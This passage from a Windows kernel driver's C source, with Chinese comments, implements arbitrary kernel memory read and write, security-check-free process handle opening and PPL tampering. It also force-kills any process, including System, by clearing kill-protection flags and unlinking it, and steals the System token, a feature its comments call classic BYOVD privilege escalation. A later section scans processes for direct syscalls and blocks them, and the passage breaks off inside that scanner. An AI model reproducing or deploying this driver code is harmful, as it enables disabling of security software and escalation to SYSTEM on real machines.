            g_ZwTerminateThread = (PFN_ZwTerminateThread)MmGetSystemRoutineAddress(&n5);
            if (g_ZwTerminateThread)
                DbgPrint("[tzd] NtTerminateThread=%p (Zw not found, Nt fallback)\n", g_ZwTerminateThread);
        }
    }

    DbgPrint("[tzd] === kill-protection offsets FINAL: Flags=+0x%X PF2=+0x%X CR=+0x%X TCF=+0x%X PLock=+0x%X Links=+0x%X ZwTermThd=%p ===\n",
             g_FlagsOffset, g_ProcessFlags2Offset, g_CommitRelinquishedOffset,
             g_ThreadCrossFlagsOffset, g_ProcessLockOffset, g_ActiveLinksOffset, g_ZwTerminateThread);
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 原有: 内核虚拟内存 R/W ──────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

// 读内核虚拟内存 → Data 写到 OutBuf 偏移 sizeof(TZD_KMEM_OP)
static NTSTATUS tzd_read_kmem(PTZD_KMEM_OP op, PVOID OutBuf, ULONG OutSize, PULONG_PTR Written)
{
    *Written = 0;
    if (!op || op->Size == 0 || op->Size > 0x1000)
        return STATUS_INVALID_PARAMETER;
    ULONG need = sizeof(TZD_KMEM_OP) + op->Size;
    if (OutSize < need)
        return STATUS_BUFFER_TOO_SMALL;
    if (op->Address == 0)
        return STATUS_INVALID_PARAMETER;
    __try
    {
        RtlCopyMemory((PUCHAR)OutBuf + sizeof(TZD_KMEM_OP),
                      (PVOID)(ULONG_PTR)op->Address, op->Size);
        *Written = need;
        return STATUS_SUCCESS;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return GetExceptionCode();
    }
}

// 写内核虚拟内存 → Data 取自 InBuf 偏移 sizeof(TZD_KMEM_OP)
static NTSTATUS tzd_write_kmem(PTZD_KMEM_OP op, ULONG InSize)
{
    if (!op || op->Size == 0 || op->Size > 0x1000)
        return STATUS_INVALID_PARAMETER;
    ULONG expected = sizeof(TZD_KMEM_OP) + op->Size;
    if (InSize < expected)
        return STATUS_BUFFER_TOO_SMALL;
    if (op->Address == 0)
        return STATUS_INVALID_PARAMETER;
    PUCHAR data = (PUCHAR)op + sizeof(TZD_KMEM_OP);
    __try
    {
        RtlCopyMemory((PVOID)(ULONG_PTR)op->Address, data, op->Size);
        return STATUS_SUCCESS;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return GetExceptionCode();
    }
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 新功能 1: 内核强制打开进程句柄 ───────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════
// 核心: ObOpenObjectByPointer(AccessMode = KernelMode) → 绕过所有安全检查
//   HandleAttributes = 0 → 句柄在调用进程句柄表 (用户态可直接 CloseHandle)
//   可打开 ANY 进程 (含其他 PPL 进程) 的 PROCESS_ALL_ACCESS 句柄
// 注: req 与 rsp 共用 METHOD_BUFFERED 单缓冲(同一 buf), 必须先快照 req 字段到局部
// 再写 rsp, 否则 rsp->Handle=NULL 会覆盖 req->Pid → 永远判 Pid==0 返回 INVALID_PARAMETER。
static NTSTATUS tzd_open_process(PTZD_OPEN_PROCESS_REQ req, PTZD_OPEN_PROCESS_RSP rsp)
{
    // 先快照 req 字段 (rsp 写入会覆盖同一缓冲的 req 区)
    ULONG pid = req ? req->Pid : 0;
    ACCESS_MASK desired = req ? req->DesiredAccess : 0;

    rsp->Handle = NULL;
    rsp->Status = STATUS_INVALID_PARAMETER;

    if (pid == 0)
        return STATUS_INVALID_PARAMETER;

    PEPROCESS eproc = NULL;
    NTSTATUS st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &eproc);
    if (!NT_SUCCESS(st))
    {
        rsp->Status = st;
        return st;
    }

    // ObOpenObjectByPointer:
    //   AccessMode = KernelMode → 不做任何安全检查 (SE_ACCESS_CHECK 被跳过)
    //   HandleAttributes = 0 → 用户态句柄 (在当前进程句柄表)
    st = ObOpenObjectByPointer(eproc, 0, NULL, desired,
                               *PsProcessType, KernelMode, &rsp->Handle);
    rsp->Status = st;

    ObDereferenceObject(eproc);
    return st;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 新功能 2: 按 PID 直接设置 PPL ─────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════
// 直接写 EPROCESS.Protection, 无需用户态 ntoskrnl 导出链
// 可选: 同时设 SignatureLevel + SectionSignatureLevel (确保 PPL 真正生效)
//   偏移关系 (ppl_common.h 验证):
//     SignatureLevel         = Protection - 2  (0x878)
//     SectionSignatureLevel  = Protection - 1  (0x879)
//     Protection             = Protection       (0x87A)
static NTSTATUS tzd_set_ppl(PTZD_SET_PPL_REQ req)
{
    if (!req || req->Pid == 0 || g_ProtectionOffset == 0)
        return STATUS_INVALID_PARAMETER;

    PEPROCESS eproc = NULL;
    NTSTATUS st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->Pid, &eproc);
    if (!NT_SUCCESS(st))
        return st;

    PUCHAR base = (PUCHAR)eproc;
    __try
    {
        if (req->SigLevel != 0)
        {
            base[g_ProtectionOffset - 2] = req->SigLevel; // SignatureLevel
            base[g_ProtectionOffset - 1] = req->SigLevel; // SectionSignatureLevel
        }
        base[g_ProtectionOffset] = req->Protection; // Protection
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        ObDereferenceObject(eproc);
        return GetExceptionCode();
    }
    ObDereferenceObject(eproc);
    return STATUS_SUCCESS;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 新功能 3: 按 PID 查询 PPL ─────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════
static NTSTATUS tzd_query_ppl(PTZD_QUERY_PPL_REQ req, PTZD_QUERY_PPL_RSP rsp)
{
    if (!req || req->Pid == 0 || g_ProtectionOffset == 0)
        return STATUS_INVALID_PARAMETER;

    PEPROCESS eproc = NULL;
    NTSTATUS st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->Pid, &eproc);
    if (!NT_SUCCESS(st))
        return st;

    __try
    {
        rsp->Protection = ((PUCHAR)eproc)[g_ProtectionOffset];
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        ObDereferenceObject(eproc);
        return GetExceptionCode();
    }
    ObDereferenceObject(eproc);
    return STATUS_SUCCESS;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 新功能 4: 内核强杀任意进程 ─────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════
// 流程: PsLookupProcessByProcessId → 清 PPL → ObOpenObjectByPointer → ZwTerminateProcess
// 覆盖一切进程:
//   • PPL 保护: 清 Protection 后 ZwTerminateProcess 不被拒
//   • 挂起/被调试/卡死: ZwTerminateProcess 直接终止线程 (不靠 APC)
//   • 僵尸 (STATUS_PROCESS_IS_TERMINATING): 强制收割 — 设退出标记+ExitStatus,
//     持 PspActiveProcessLock 从 PsActiveProcessHead 摘除, deref 让对象释放
//   • System (PID=4) / 任意 PID: 无过滤
// EPROCESS 偏移 (Win11 22621, IDA 验证):
//   ActiveProcessLinks=+0x448  ExitStatus=+0x7D4  Flags=+0x464 (bit2=ProcessExiting)
//   Protection=+0x87A (g_ProtectionOffset 动态解析)
//   PspActiveProcessLock = 内核基址 + 0xD54AD0 (EX_PUSH_LOCK)
extern ULONG64 tzd_systrace_resolve_base(void); // 前向声明 (定义在下方)
// EPROCESS 偏移由 tzd_init_offsets 动态解析 (g_UniquePidOffset/g_ActiveLinksOffset/g_ExitStatusOffset)
// PspActiveProcessLock 由 tzd_init_offsets 动态解析 (g_PspActiveProcessLock)
static NTSTATUS tzd_kill_process(PTZD_KILL_REQ req)
{
    if (!req || req->Pid == 0)
        return STATUS_INVALID_PARAMETER;

    // ★ 版本标记: 确认新代码在运行 (如果看不到此行 = 旧驱动未更新)
    DbgPrint("[tzd] KILL: v3 pid=%lu offsets: Prot=0x%X Uid=0x%X Links=0x%X Exit=0x%X Flags=0x%X PF2=0x%X CR=0x%X TCF=0x%X Lock=%p ZwTermThd=%p\n",
             req->Pid, g_ProtectionOffset, g_UniquePidOffset, g_ActiveLinksOffset,
             g_ExitStatusOffset, g_FlagsOffset, g_ProcessFlags2Offset,
             g_CommitRelinquishedOffset, g_ThreadCrossFlagsOffset,
             g_PspActiveProcessLock, g_ZwTerminateThread);

    PEPROCESS eproc = NULL;
    NTSTATUS st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->Pid, &eproc);
    if (!NT_SUCCESS(st))
        return st;

    // ★ 清 PPL: Protection + SignatureLevel + SectionSignatureLevel = 0
    if (g_ProtectionOffset != 0)
    {
        PUCHAR base = (PUCHAR)eproc;
        __try
        {
            base[g_ProtectionOffset] = 0;
            base[g_ProtectionOffset - 2] = 0;
            base[g_ProtectionOffset - 1] = 0;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
        }
    }

    // ★★★ 清除内核三层 kill 保护标志 (IDA 反编译确认) ★★★
    //   层1: EPROCESS.ProcessFlags bit10 (0x400) — 若 set 则 PspTerminateProcess 跳过
    //        PspTerminateAllThreads → 线程不被终止
    //   层2: EPROCESS.CommitRelinquished bit0 (0x1) — 若 set 则
    //        PspTerminateThreadByPointer 返回 STATUS_SPECIAL_ACCOUNT
    //   层3: ETHREAD.CrossThreadFlags bit10 (0x400) — 若 set 则
    //        PspTerminateThreadByPointer 返回 STATUS_ACCESS_DENIED
    //   清除层1+层2 后 ZwTerminateProcess 应能正常调用 PspTerminateAllThreads
    //   层3 在下方线程遍历时逐线程清除
    if (g_ProcessFlags2Offset != 0 || g_CommitRelinquishedOffset != 0)
    {
        PUCHAR base = (PUCHAR)eproc;
        __try
        {
            if (g_ProcessFlags2Offset != 0)
            {
                ULONG *pFlags = (ULONG *)(base + g_ProcessFlags2Offset);
                *pFlags &= ~(1u << 10); // 清 bit10 (0x400): 允许 PspTerminateAllThreads
            }
            if (g_CommitRelinquishedOffset != 0)
            {
                ULONG *pCommit = (ULONG *)(base + g_CommitRelinquishedOffset);
                *pCommit &= ~1u; // 清 bit0: 允许 PspTerminateThreadByPointer
            }
            DbgPrint("[tzd] KILL: pid=%lu cleared kill-protection flags (PF2@+0x%X b10, CR@+0x%X b0)\n",
                     req->Pid, g_ProcessFlags2Offset, g_CommitRelinquishedOffset);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
        }
    }

    // ★★★ 清除层3: 遍历线程列表, 清 ETHREAD.CrossThreadFlags bit10 ★★★
    //   必须在 ZwTerminateProcess 前清除, 否则 PspTerminateThreadByPointer
    //   对每个线程返回 STATUS_ACCESS_DENIED → 线程不被终止
    if (g_ThreadListHeadOffset != 0 && g_ThreadListEntryOffset != 0 &&
        g_ThreadCrossFlagsOffset != 0)
    {
        PUCHAR base = (PUCHAR)eproc;
        __try
        {
            PLIST_ENTRY head = (PLIST_ENTRY)(base + g_ThreadListHeadOffset);
            PLIST_ENTRY entry = head->Flink;
            ULONG count = 0;
            while (entry != head && entry != NULL && count < 4096)
            {
                PETHREAD thread = (PETHREAD)((PUCHAR)entry - g_ThreadListEntryOffset);
                ULONG *pThrFlags = (ULONG *)((PUCHAR)thread + g_ThreadCrossFlagsOffset);
                *pThrFlags &= ~(1u << 10); // 清 bit10 (0x400)
                count++;
                entry = entry->Flink;
            }
            DbgPrint("[tzd] KILL: pid=%lu cleared layer3 (TCF bit10) on %lu threads\n",
                     req->Pid, count);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            DbgPrint("[tzd] KILL: layer3 clear exception %lx\n", GetExceptionCode());
        }
    }
    else
        DbgPrint("[tzd] KILL: layer3 NOT cleared (TLH=0x%X TLE=0x%X TCF=0x%X)\n",
                 g_ThreadListHeadOffset, g_ThreadListEntryOffset, g_ThreadCrossFlagsOffset);

    HANDLE hProc = NULL;
    st = ObOpenObjectByPointer(eproc, 0, NULL, PROCESS_TERMINATE,
                               *PsProcessType, KernelMode, &hProc);
    if (!NT_SUCCESS(st))
    {
        ObDereferenceObject(eproc);
        return st;
    }

    st = ZwTerminateProcess(hProc, req->ExitStatus);
    ZwClose(hProc);

    // ★★★ 修复: 对 ZwTerminateProcess 的 ANY 失败执行多级强制终止 ★★★
    //   原来只处理 STATUS_PROCESS_IS_TERMINATING → PID=4 System 进程等
    //   "顽固"进程返回其他错误码 (STATUS_CANT_TERMINATE_SELF / 内核拒绝)
    //   直接 fall-through 返回错误 → 调用方以为杀不掉。
    //
    //   三级终止策略:
    //   方法 1: ZwTerminateProcess(handle) — 已在上方尝试 (正常路径)
    //   方法 2: KeStackAttachProcess + ZwTerminateProcess(NULL) — 绕过 CANT_TERMINATE_SELF
    //           NtTerminateProcess(NULL): Process = PsGetCurrentProcess() = 附着后的目标
    //           跳过 "Process==CurrentProcess→CANT_TERMINATE_SELF" 检查 (仅 handle!=NULL 时检查)
    //           PspTerminateProcess 正常调用: 设 Flags bit3 + PspTerminateAllThreads (APC 异步)
    //   方法 3: 手动强制收割 (只在方法 2 也失败时):
    //           1. 设 Flags bit3 + ExitStatus
    //           2. 遍历线程列表终止每个线程
    //           3. 持 PspActiveProcessLock 从 PsActiveProcessHead 摘除
    //   覆盖: System (PID=4) / 任意 PPL / 挂起 / 僵尸 / 内核拒绝终止的进程
    if (!NT_SUCCESS(st))
    {
        DbgPrint("[tzd] KILL: pid=%lu ZwTerminateProcess(handle) status=0x%lx, trying attach+terminate\n",
                 req->Pid, st);

        // ★ 方法 2: 附着到目标进程, 用 ZwTerminateProcess(NULL) 绕过 CANT_TERMINATE_SELF
        //   这是杀死 PID=4 (System) 的关键:
        //   - ZwTerminateProcess(handle) 对 System 返回 CANT_TERMINATE_SELF (因为 handle!=NULL 且 Process==Current? 不一定)
        //   - 但 ZwTerminateProcess(NULL) 不检查 CANT_TERMINATE_SELF, 直接用 PsGetCurrentProcess()
        //   - 附着后 PsGetCurrentProcess() = 目标进程 → PspTerminateProcess 正常执行
        //   - PspTerminateProcess 调用 PspTerminateAllThreads → APC 异步终止所有线程
        //   注: 当前线程不在目标的线程列表中 (它是借用者), 不会被立即终止
        {
            TZD_KAPC_STATE apcState;
            KeStackAttachProcess(eproc, &apcState);
            NTSTATUS st2 = ZwTerminateProcess(NULL, req->ExitStatus);
            KeUnstackDetachProcess(&apcState);

            if (NT_SUCCESS(st2))
            {
                DbgPrint("[tzd] KILL: pid=%lu attach+terminate OK status=0x%lx (PspTerminateProcess called, APCs queued)\n",
                         req->Pid, st2);
                ObDereferenceObject(eproc);
                return STATUS_SUCCESS;
            }
            DbgPrint("[tzd] KILL: pid=%lu attach+terminate failed status=0x%lx, force-reaping\n",
                     req->Pid, st2);
        }

        // ★ 方法 3: 手动强制收割 (只在方法 2 也失败时)
        if (g_ActiveLinksOffset != 0)
        {
            PUCHAR base = (PUCHAR)eproc;
            __try
            {
                ULONG threadCount = 0; // 线程终止计数 (线程遍历块内更新)

                // 1. 设 ExitStatus (若已解析)
                if (g_ExitStatusOffset != 0)
                    *(NTSTATUS *)(base + g_ExitStatusOffset) = req->ExitStatus;

                // 2. 设 ProcessExiting 标志位 (Flags bit3 = ProcessTerminating)
                //    动态解析 g_FlagsOffset (从 PsGetProcessExitProcessCalled)
                //    PspTerminateProcess: or r10d, 8 → lock cmpxchg [rcx+Flags], r10d
                //    bit3 (值 8) = PSF_PROCESS_TERMINATING
                if (g_FlagsOffset != 0)
                {
                    ULONG *pFlags = (ULONG *)(base + g_FlagsOffset);
                    *pFlags |= (1u << 3); // bit3 = PSF_PROCESS_TERMINATING
                }

                // 3. 遍历线程列表终止每个线程
                //    动态解析 g_ThreadListHeadOffset + g_ThreadListEntryOffset
                //    (从 PsGetNextProcessThread 机器码解析)
                if (g_ThreadListHeadOffset != 0 && g_ThreadListEntryOffset != 0)
                {
                    PLIST_ENTRY threadListHead = (PLIST_ENTRY)(base + g_ThreadListHeadOffset);
                    PLIST_ENTRY entry = threadListHead->Flink;
                    while (entry != threadListHead && entry != NULL)
                    {
                        // ETHREAD 基址 = entry - g_ThreadListEntryOffset (CONTAINING_RECORD)
                        PETHREAD thread = (PETHREAD)((PUCHAR)entry - g_ThreadListEntryOffset);
                        __try
                        {
                            // ★ 清除层3: ETHREAD.CrossThreadFlags bit10 (0x400)
                            //   允许 PspTerminateThreadByPointer 正常执行 (否则 ACCESS_DENIED)
                            if (g_ThreadCrossFlagsOffset != 0)
            {
                                ULONG *pThrFlags = (ULONG *)((PUCHAR)thread + g_ThreadCrossFlagsOffset);
                                *pThrFlags &= ~(1u << 10);
                            }
                            // 打开线程句柄并终止 (用动态解析的 g_ZwTerminateThread)
                            HANDLE hThread = NULL;
                            NTSTATUS ts = ObOpenObjectByPointer(thread, 0, NULL,
                                                                 0x0001 /*THREAD_TERMINATE*/,
                                                                 *PsThreadType, KernelMode,
                                                                 &hThread);
                            if (NT_SUCCESS(ts) && g_ZwTerminateThread)
                            {
                                g_ZwTerminateThread(hThread, req->ExitStatus);
                                ZwClose(hThread);
                                threadCount++;
                            }
                            else if (hThread)
                            {
                                ZwClose(hThread);
                            }
                        }
                        __except (EXCEPTION_EXECUTE_HANDLER)
                        {
                            // 单个线程终止失败不影响整体
                        }
                        entry = entry->Flink;
                        // 安全阀: 防止链表损坏导致无限循环
                        if (threadCount > 4096)
                            break;
                    }
                    DbgPrint("[tzd] KILL: pid=%lu force-terminated %lu threads\n",
                             req->Pid, threadCount);
                }
                else
                    DbgPrint("[tzd] KILL: ThreadListHead/Entry offsets not resolved, skipping thread term\n");

                // 4. 从 PsActiveProcessHead 摘除
                //   有 PspActiveProcessLock → 安全摘除 (持锁)
                //   无 PspActiveProcessLock → 直接摘 (无锁, force-kill 可接受)
                PLIST_ENTRY ple = (PLIST_ENTRY)(base + g_ActiveLinksOffset);
                if (ple->Flink != ple) // 还在链表中
                {
                    if (g_PspActiveProcessLock != NULL)
                    {
                        EX_PUSH_LOCK *plock = (EX_PUSH_LOCK *)g_PspActiveProcessLock;
                        KeEnterCriticalRegion();
                        ExAcquirePushLockExclusive(plock);
                        if (ple->Flink != ple)
                            RemoveEntryList(ple);
                        ExReleasePushLockExclusive(plock);
                        KeLeaveCriticalRegion();
                    }
                    else
                    {
                        // 无锁直接摘 (force-kill 容忍竞态)
                        ple->Blink->Flink = ple->Flink;
                        ple->Flink->Blink = ple->Blink;
                        ple->Flink = ple; // 标记为已摘
                        ple->Blink = ple;
                    }
                }

                DbgPrint("[tzd] KILL: pid=%lu force-reaped (threads=%lu, removed from active list)\n",
                         req->Pid, threadCount);
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                DbgPrint("[tzd] KILL: force-reap exception %lx, continuing\n", GetExceptionCode());
            }
        }
        else
            DbgPrint("[tzd] KILL: offsets/lock not resolved, skipping force-reap\n");
        ObDereferenceObject(eproc);
        return STATUS_SUCCESS;
    }

    ObDereferenceObject(eproc);
    return st;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 新功能 5: Token 窃取 (提权到 SYSTEM) ──────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════
// 经典 BYOVD 提权: 复制 System (PID=4) 的 Token 到目标进程
//   EPROCESS.Token 是 _EX_FAST_REF: 8 字节, 低 4 位 = 引用计数
//   直接复制原始值 (含 refcount bits) → 目标进程获得 SYSTEM 权限
static NTSTATUS tzd_steal_token(PTZD_STEAL_TOKEN_REQ req)
{
    if (!req || req->TargetPid == 0)
        return STATUS_INVALID_PARAMETER;

    ULONG srcPid = req->SourcePid ? req->SourcePid : 4; // 默认 System

    PEPROCESS srcEproc = NULL, tgtEproc = NULL;
    NTSTATUS st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)srcPid, &srcEproc);
    if (!NT_SUCCESS(st))
        return st;
    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->TargetPid, &tgtEproc);
    if (!NT_SUCCESS(st))
    {
        ObDereferenceObject(srcEproc);
        return st;
    }

    __try
    {
        // 读源进程 Token (_EX_FAST_REF, 含引用计数位)
        ULONG_PTR srcToken = *(ULONG_PTR *)((PUCHAR)srcEproc + EPROCESS_TOKEN_OFFSET);
        // 直接写入目标进程 (保留 refcount 编码)
        *(ULONG_PTR *)((PUCHAR)tgtEproc + EPROCESS_TOKEN_OFFSET) = srcToken;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        ObDereferenceObject(srcEproc);
        ObDereferenceObject(tgtEproc);
        return GetExceptionCode();
    }

    ObDereferenceObject(srcEproc);
    ObDereferenceObject(tgtEproc);
    return STATUS_SUCCESS;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 直接 syscall 扫描 + NX 阻断 (PG-safe) ─────────────────────────────
//   不 hook KiSystemCall64 (PatchGuard 会蓝屏), 而是: 按 PID 扫描目标进程
//   可执行内存, 在非豁免(非 seckill_native.dll 等)/非签名镜像/shellcode 区段
//   搜 syscall(0F 05) 指令 → 报告 + 用 ZwProtectVirtualMemory 把命中页改
//   PAGE_READWRITE (清执行位) → 对方一执行该 syscall 就 #PF 被阻断。
//   防注入到签名 DLL: 对签名镜像内被改写(CoW)页里的 syscall 一样抓得到。
// ═══════════════════════════════════════════════════════════════════════

// 大小写不敏感: 判断 u 末尾(最后一个 \ 之后)是否等于 tail
static BOOLEAN tzd_name_endswith_ci(const UNICODE_STRING *u, const WCHAR *tail)
{
    if (!u || !u->Buffer || u->Length < sizeof(WCHAR))
        return FALSE;
    USHORT len = u->Length / sizeof(WCHAR);
    const WCHAR *buf = u->Buffer;
    USHORT base = 0;
    for (USHORT i = 0; i < len; i++)
        if (buf[i] == L'\\' || buf[i] == L'/')
            base = i + 1;
    USHORT tl = 0;
    while (tail[tl])
        tl++;
    if (len - base < tl)
        return FALSE;
    for (USHORT i = 0; i < tl; i++)
    {
        WCHAR a = buf[base + i], b = tail[i];
        if (a >= L'A' && a <= L'Z')
            a = (WCHAR)(a + 32);
        if (b >= L'A' && b <= L'Z')
            b = (WCHAR)(b + 32);
        if (a != b)
            return FALSE;
    }
    return TRUE;
}

// 间接 syscall 桩检测: 控制转移 (E8/E9 rel32 或 FF15/FF25 [rip+disp], |disp|<0x1000) 跳进
//   ntdll, 且目标处 2 字节 == 0F 05 (真 syscall 指令)。
//   noAnchor=TRUE : 不要求 mov eax,ssn 锚 → 抗 eax 设置混淆 (寄存器重排 mov r10d,ssn;mov
//   eax,r10d / 动态解密 SSN 均抓 — 不变量是"跳到 ntdll 的 0F 05", 与 eax 怎么设无关)。
//   仅非代码缓存区用 (代码缓存区 FF15 太多 → CPU; 且 JIT 不跳 ntdll 的 0F 05 字节 → 锚版够)。
//   noAnchor=FALSE: 须前 16 字节内有 B8 imm<0x1400 (mov r32,ssn) → 省 FF 解引用, 代码缓存区用。
static BOOLEAN tzd_sc_indirect_hit(PEPROCESS eproc, PEPROCESS selfProc,
                                   PUCHAR pageVa, const UCHAR *buf, SIZE_T got,
                                   BOOLEAN noAnchor, PULONG_PTR outStubVa)
{
    ULONG64 nb = g_NtdllBase;
    SIZE_T ns = g_NtdllSize;
    if (!nb || !ns)
        return FALSE;
    PUCHAR nbase = (PUCHAR)nb, nend = nbase + ns;
    for (SIZE_T j = 0; j + 6 <= got; j++)
    {
        UCHAR op0 = buf[j], op1 = buf[j + 1];
        BOOLEAN isE8E9 = (op0 == 0xE8 || op0 == 0xE9);
        BOOLEAN isFF = (op0 == 0xFF && (op1 == 0x15 || op1 == 0x25));
        if (!isE8E9 && !isFF)
            continue;
        // 锚版: 须前 16 字节内有 B8 imm<0x1400 (在 FF 解引用前判, 省 MmCopy)
        if (!noAnchor)
        {
            BOOLEAN hasSsn = FALSE;
            for (SIZE_T k = (j >= 16 ? j - 16 : 0); k + 5 <= j; k++)
            {
                if (buf[k] == 0xB8 && *(const ULONG *)(buf + k + 1) < 0x1400)
                {
                    hasSsn = TRUE;
                    break;
                }
            }
            if (!hasSsn)
                continue;
        }
        PUCHAR target = NULL;
        if (isE8E9)
        { // call/jmp rel32
            LONG rel = *(const LONG *)(buf + j + 1);
            target = (PUCHAR)((ULONG64)pageVa + j + 5 + rel);
        }
        else
        { // call/jmp [rip+disp32]
            LONG disp = *(const LONG *)(buf + j + 2);
            if (disp < -0x1000 || disp >= 0x1000)
                continue; // 仅本地数据槽 (远 disp 跳过, 省 MmCopy)
            ULONG64 ptrAddr = (ULONG64)pageVa + j + 6 + disp;
            ULONG64 tgt = 0;
            SIZE_T rg = 0;
            NTSTATUS r = MmCopyVirtualMemory(eproc, (PVOID)ptrAddr, selfProc, &tgt, 8, 0, &rg);
            if (!NT_SUCCESS(r) || rg < 8)
                continue;
            target = (PUCHAR)tgt;
        }
        if (target < nbase || target >= nend)
            continue; // 目标须在 ntdll
        UCHAR t2[2] = {0, 0};
        SIZE_T rg2 = 0; // 目标处 2 字节 == 0F 05 ?
        NTSTATUS r2 = MmCopyVirtualMemory(eproc, target, selfProc, t2, 2, 0, &rg2);
        if (NT_SUCCESS(r2) && rg2 >= 2 && t2[0] == 0x0F && t2[1] == 0x05)
        {
            if (outStubVa)
                *outStubVa = (ULONG64)pageVa + j;
            return TRUE;
        }
    }
    return FALSE;
}

// 窗口直接 syscall 检测 (抗混淆): 0F 05 前 32 字节内有 SSN 载入即命中。
//   SSN 载入形态: B8..BF (mov r32,imm32) 或 41 B8..BF (mov r8d..r15d,imm32), imm<0x1400。
//   容忍冗余指令/NOP 插入 与 寄存器重排 (mov r10d,ssn; mov eax,r10d; syscall) — 因不变量
//   是"0F 05 前曾有某寄存器被载入 SSN"。仅非代码缓存区用 (避 JIT 巧合 0F 05 + 小 imm 误杀)。
static BOOLEAN tzd_sc_windowed_direct(PUCHAR pageVa, const UCHAR *buf, SIZE_T got,
                                      PULONG_PTR outStubVa)
{
    for (SIZE_T i = 0; i + 2 <= got; i++)
    { // i = 0F 05 位置
        if (buf[i] != 0x0F || buf[i + 1] != 0x05)
            continue;
        SIZE_T kmin = (i >= 32) ? (i - 32) : 0;
        BOOLEAN hasSsn = FALSE;
        for (SIZE_T k = kmin; k + 5 <= i; k++)
        { // B8+rd: opcode@k, imm@k+1..k+4
            UCHAR b0 = buf[k];
            if (b0 >= 0xB8 && b0 <= 0xBF)
            { // mov r32, imm32
                if (*(const ULONG *)(buf + k + 1) < 0x1400)
                {
                    hasSsn = TRUE;
                    break;
                }
            }
            if (k + 6 <= i && b0 == 0x41 && buf[k + 1] >= 0xB8 && buf[k + 1] <= 0xBF)
            { // 41 B8+rd: r8d..r15d
                if (*(const ULONG *)(buf + k + 2) < 0x1400)
                {
                    hasSsn = TRUE;
                    break;
                }
            }
        }
        if (hasSsn)
        {
            if (outStubVa)
                *outStubVa = (ULONG64)pageVa + i;
            return TRUE;
        }
    }
    return FALSE;
}

static NTSTATUS tzd_scan_syscalls(PTZD_SCAN_RESULT result)
{
    if (!result)
        return STATUS_INVALID_PARAMETER;
    result->Hits = 0;
    result->NxBlocked = 0;
    result->Reserved[0] = result->Reserved[1] = 0;
    if (!g_MonitorPid)
        return STATUS_INVALID_PARAMETER;
    if (!g_ZwQueryVirtualMemory || !g_ZwProtectVirtualMemory)
        return STATUS_NOT_IMPLEMENTED;

    PEPROCESS eproc = NULL;
    NTSTATUS st = PsLookupProcessByProcessId(g_MonitorPid, &eproc);
    if (!NT_SUCCESS(st))
        return st;

    // 拿目标进程句柄 (跨进程查询/读/改保护用)
    // 不用 KeStackAttachProcess (避免 KAPC_STATE 头文件缺失 + 附着竞态)
    HANDLE hProc = NULL;
    st = ObOpenObjectByPointer(eproc, 0x80000000 /*OBJ_KERNEL_HANDLE*/, NULL,
                               0x001F0FFF /*PROCESS_ALL_ACCESS*/, *PsProcessType, 0 /*KernelMode*/, &hProc);
    if (!NT_SUCCESS(st))
    {
        ObDereferenceObject(eproc);
        return st;
    }

    PEPROCESS selfProc = PsGetCurrentProcess();
    UCHAR pageBuf[0x1000]; // 4KB 读缓冲 (MmCopyVirtualMemory 把目标页读到这)

    __try
    {
        TZD_MEMORY_BASIC_INFORMATION mbi;
        PUCHAR addr = (PUCHAR)0x10000ULL; // 从 64KB 起扫 (跳过低页)
        PUCHAR userMax = (PUCHAR)0x00007FFFFFFFFFFFULL;
        while (addr < userMax)
        {
            SIZE_T ret = 0;
            NTSTATUS q = g_ZwQueryVirtualMemory(hProc, addr, 0 /*MemoryBasicInformation*/,
                                                &mbi, sizeof(mbi), &ret);
            if (!NT_SUCCESS(q) || mbi.RegionSize == 0)
                break;
            PUCHAR regionBase = (PUCHAR)mbi.BaseAddress;
            SIZE_T regionSize = mbi.RegionSize;
            addr = regionBase + regionSize; // 推进到下一区段

            if (mbi.State != MEM_COMMIT)
                continue; // 只扫已提交
            if (!(mbi.Protect & 0xF0 /*PAGE_EXECUTE_* */))
                continue; // 只扫可执行

            // 豁免: 取映射文件名, 末尾匹配豁免名单 (ntdll/win32u/seckill_native...)
            BOOLEAN exempt = FALSE;
            if (mbi.Type == 0x1000000 /*MEM_IMAGE*/)
            {
                UCHAR nameBuf[520];
                SIZE_T nr = 0;
                NTSTATUS nq = g_ZwQueryVirtualMemory(hProc, regionBase,
                                                     2 /*MemoryMappedFilenameInformation*/,
                                                     nameBuf, sizeof(nameBuf), &nr);
                if (NT_SUCCESS(nq) && nr >= sizeof(UNICODE_STRING))
                {
                    PUNICODE_STRING un = (PUNICODE_STRING)nameBuf;
                    __try
                    {
                        if (un->Buffer && un->Length)
                        {
                            // 捕获 ntdll 可执行区范围 (供间接 syscall 检测; 仅一次)
                            if (!g_NtdllBase && tzd_name_endswith_ci(un, L"ntdll.dll"))
                            {
                                g_NtdllBase = (ULONG64)regionBase;
                                g_NtdllSize = regionSize;
                            }
                            for (int i = 0; i < (int)(sizeof(g_ExemptTails) / sizeof(g_ExemptTails[0])); i++)
                            {
                                if (tzd_name_endswith_ci(un, g_ExemptTails[i]))
                                {
                                    exempt = TRUE;
